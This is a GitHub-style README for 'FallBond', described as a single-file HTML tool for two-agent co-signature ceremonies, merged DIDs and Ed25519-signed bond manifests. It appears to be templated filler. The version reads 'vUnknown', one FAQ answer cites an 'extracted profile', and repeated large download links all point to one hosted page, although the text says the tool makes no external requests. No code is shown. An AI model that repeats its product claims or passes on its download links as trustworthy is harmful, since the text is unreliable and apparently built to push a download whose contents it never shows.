# FallBond vUnknown - sovereign professional-service workflow tool 2026

> **FallBond is a browser-based sovereign bonding workflow tool delivered as one HTML file. It is built for two-agent co-signature ceremonies, merged DID creation, and offline provenance handling, with the current version reported as Unknown.**

[![Platform](https://img.shields.io/badge/Platform-browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-vUnknown-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/oliver-king1990/fallbond-provenance-hub?style=flat-square)](https://github.com/oliver-king1990/fallbond-provenance-hub)

---

<p align="center">
  <a href="https://oliver-king1990.github.io/fallbond-provenance-hub/">
    <img src="https://img.shields.io/badge/Download-FallBond%20Latest-brightgreen?style=for-the-badge" alt="Download FallBond">
  </a>
</p>

> **[Direct Download - FallBond vUnknown](https://oliver-king1990.github.io/fallbond-provenance-hub/)**

---

[Download Latest Build](https://oliver-king1990.github.io/fallbond-provenance-hub/)

---

## What FallBond Is

FallBond provides a browser-native way to run a cryptographic bonding ceremony between two agents. The workflow focuses on co-signing, deriving a merged DID, and producing signed bond manifests so the participants end up with a clear, structured record of the agreement and its provenance.

It ships as a single-file HTML experience with offline-friendly behavior, so it can be opened directly in a browser without adding a larger application stack. The design suits teams and operators who want a compact, local-first ceremony flow built around WebCrypto, Ed25519 signing, and browser storage instead of external services.

---

## Core Capabilities

- Two-agent co-signature flow for shared bonding steps
- Merged DID derivation for unified identity output
- Signed bond manifest creation for ceremony records
- Provenance inheritance to keep origin context intact
- Ed25519 keypair signing support
- IndexedDB-backed local storage for browser-side persistence
- Offline-capable delivery as a single HTML file
- Zero external requests during normal operation

---

## Getting Started

1. Download or clone the repository.
2. Open the single HTML file in a modern browser.
3. If you are publishing it through GitHub Pages, use the hosted download link above or your deployed static path.

Example local launch flow:

1. Save the HTML file into a folder such as `fallbond-sovereign-bonding-ceremony`
2. Open the file directly in the browser, or serve it with any static file server
3. Start a bonding session from the interface

---

## How to Use It

Typical workflow:

1. Open FallBond in the browser.
2. Create or load the two-agent ceremony context.
3. Generate or import Ed25519 keypairs as needed.
4. Run the co-signature step to produce the bond output.
5. Review the merged DID and signed bond manifest.
6. Store or export the resulting artifact for later reference.

If you host the file locally, keep the browser session active while the ceremony is in progress so IndexedDB storage can preserve the working state.

---

## Runtime and Storage

FallBond is configured mainly through the browser session and local storage.

```text
Storage: IndexedDB
Runtime: Modern browser with WebCrypto support
Delivery: Single HTML file
Network: No external requests
```

If the interface exposes settings, those controls remain client-side rather than being moved into a separate server configuration file.

---

## Requirements

- A modern browser with WebCrypto support
- IndexedDB support for local persistence
- JavaScript enabled
- A local or hosted static file delivery method
- No server-side runtime is required for the core flow

---

## FAQ

### Does FallBond need an internet connection?
No. After the single HTML file is loaded, it is intended to work offline.

### Where is ceremony data stored?
State is retained in the browser through IndexedDB.

### What cryptography does it use?
The extracted profile references Ed25519 and WebCrypto.

### Can I customize the workflow?
If the interface offers configuration, it is handled inside the browser on the client side rather than through a remote backend.

### What should I do if the file does not open correctly?
Use a modern browser, make sure JavaScript is enabled, and try serving the file from a static host if direct opening is restricted by browser policy.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
